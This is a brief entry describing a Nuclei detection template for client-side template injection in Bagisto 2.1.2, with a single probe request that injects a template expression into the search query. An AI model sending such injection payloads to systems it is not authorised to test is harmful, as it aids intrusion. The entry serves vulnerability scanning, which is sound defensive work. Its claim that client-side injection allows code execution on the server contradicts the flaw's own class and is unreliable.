# Nuclei Template: Bagisto 2.1.2 Client-Side Template Injection
**Template ID:** bagisto-csti
**Vulnerability Class:** Code Injection
**Severity:** Medium
**CWE:** CWE-94
**Source:** Nuclei Template (`bagisto-csti.yaml`)

## Vulnerability Information & PoC

## Description
Bagisto is vulnerable to Client-Side Template Injection (CSTI), which allows an attacker to execute arbitrary code on the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/bagisto-common/search?query={{2288*'9876'}}
```

## References
- https://packetstormsecurity.com/files/179153/Bagisto-2.1.2-Client-Side-Template-Injection.html
- https://demo.bagisto.com/
